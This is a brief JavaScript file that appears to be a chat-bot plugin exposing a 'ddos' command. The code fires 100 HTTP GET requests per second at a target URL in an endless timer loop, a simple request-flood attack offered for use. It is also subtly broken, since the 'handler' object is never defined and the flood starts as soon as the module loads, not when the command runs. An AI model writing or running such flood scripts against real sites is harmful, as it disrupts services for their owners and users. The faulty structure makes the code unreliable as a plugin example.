const http = require('http');

const targetUrl = 'http://www.example.com';
const requestsPerSecond = 100;

setInterval(() => {
  for (let i = 0; i < requestsPerSecond; i++) {
    http.get(targetUrl, (res) => {
      console.log('Request sent');
    }).on('error', (err) => {
      console.error('Error:', err.message);
    });
  }
}, 1000);

handler.help = ['ddos']
handler.tags = ['github']
handler.command = /ddos/i

handler.limit = true
handler.group = true


module.exports = handler
